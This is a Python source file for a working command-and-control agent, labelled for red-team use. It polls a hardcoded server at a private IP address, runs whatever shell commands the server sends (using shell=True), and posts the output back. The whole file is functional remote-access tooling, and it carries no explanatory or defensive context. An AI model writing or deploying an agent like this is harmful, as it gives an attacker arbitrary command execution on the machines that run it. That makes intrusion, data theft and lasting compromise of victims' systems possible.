#!/usr/bin/env python3
import requests
import subprocess
import time
import uuid
import socket
import os
import argparse
import sys

# PRE-CONFIGURED FOR YOUR NETWORK
DEFAULT_SERVER = "http://192.168.1.237:5000"

class Agent:
    def __init__(self, server_url, interval):
        self.server_url = server_url.rstrip('/')
        self.interval = interval
        self.id = self.get_id()
        
    def get_id(self):
        id_file = ".agent_id"
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
        else:
            agent_id = f"{socket.gethostname()}_{uuid.uuid4().hex[:8]}"
            with open(id_file, 'w') as f:
                f.write(agent_id)
            return agent_id
    
    def execute(self, command):
        try:
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed to: {os.getcwd()}"
            
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "Command executed (no output)"
            return f"[{os.getcwd()}] $ {command}\n{output}"
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def run(self):
        print("\n" + "="*50)
        print("C2 AGENT STARTED (WINDOWS OPTIMIZED)")
        print("="*50)
        print(f"Agent ID: {self.id}")
        print(f"Server: {self.server_url}")
        print(f"Beacon: Every {self.interval} seconds")
        print("Press Ctrl+C to stop")
        print("="*50 + "\n")
        
        while True:
            try:
                # Send beacon
                response = requests.post(f"{self.server_url}/beacon", 
                                       json={'agent_id': self.id}, 
                                       timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    if 'command' in data:
                        print(f"\n[→] Received command: {data['command']}")
                        output = self.execute(data['command'])
                        print(f"[✓] Executed")
                        
                        # Send result
                        requests.post(f"{self.server_url}/result", 
                                    json={
                                        'command_id': data['command_id'],
                                        'output': output,
                                        'agent_id': self.id
                                    }, timeout=10)
                        print(f"[←] Result sent\n")
                    else:
                        print(f"[✓] Beacon OK - {time.strftime('%H:%M:%S')}")
                
                time.sleep(self.interval)
                
            except KeyboardInterrupt:
                print("\n[+] Stopping agent...")
                break
            except requests.exceptions.ConnectionError:
                print(f"[✗] Cannot connect to {self.server_url}")
                time.sleep(5)
            except Exception as e:
                print(f"[✗] Error: {e}")
                time.sleep(5)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Red Team C2 Agent")
    parser.add_argument("--server", default=DEFAULT_SERVER, help="C2 Server URL")
    parser.add_argument("--interval", type=int, default=5, help="Beacon interval in seconds")
    
    args = parser.parse_args()
    
    agent = Agent(args.server, args.interval)
    agent.run()
